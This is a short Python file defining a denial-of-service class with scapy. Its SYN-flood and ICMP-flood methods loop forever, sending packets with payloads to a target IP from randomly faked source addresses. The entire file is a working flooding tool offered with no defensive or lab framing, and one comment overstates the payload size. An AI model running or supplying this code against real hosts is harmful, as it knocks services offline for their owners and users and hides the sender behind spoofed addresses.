from scapy.all import Ether, ICMP, TCP, IP, Raw, send
from faker import Faker

class DOS:
    def __init__(self, targetIP):
        self.target = targetIP

    def synFlood(self):   
        while True:
            # Get new fake IP address for the IP header source field
            fake = Faker()
            fakeIpAddr = fake.ipv4()
            
            packetStack = IP(dst = self.target, src = fakeIpAddr) / TCP(sport = 80, dport = 443, flags = "S")
            
            # 57344 additional bytes
            payload = Raw(b"abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ1234567890!@#$%^&*()")
            
            payloadPacket = packetStack / payload

            send(payloadPacket, verbose = 0)

    def icmpFlood(self):
        while True:
            fake = Faker()
            fakeIpAddr = fake.ipv4()

            packetStack = IP(dst = self.target, src = fakeIpAddr) / ICMP()
            
            # 57344 additional bytes added
            payload = Raw(b"abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ1234567890!@#$%^&*()")

            payloadPacket = packetStack / payload

            send(payloadPacket, verbose = 0)